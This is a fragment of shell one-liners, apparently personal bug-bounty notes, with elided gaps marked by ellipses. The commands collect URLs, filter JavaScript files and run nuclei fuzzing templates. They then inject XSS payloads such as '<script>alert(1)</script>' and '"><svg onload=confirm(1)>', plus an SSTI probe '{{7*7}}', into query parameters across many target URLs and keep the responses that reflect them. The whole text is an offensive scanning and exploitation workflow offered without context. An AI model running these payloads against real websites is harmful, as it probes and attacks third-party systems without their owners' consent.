...
cat gau allurls | grep -E '\.(js|txt)$' | anew js
...
nuclei -t /home/edio/fuzzing-templates -list gau | anew fuzzingtemplates;
...
cat xss | uro | qsreplace '"><img src=x onerror=alert(1);>'  | freq | egrep -v 'Not' | anew xss1.1;
cat xss | qsreplace '<script>alert(1)</script>' | freq | egrep -v 'Not' | anew xss2.1;
cat xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3.1;
cat xss | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss4.1;
cat ssti | qsreplace '{{7*7}}' | freq | egrep -v 'Not' | anew ssti2.1;
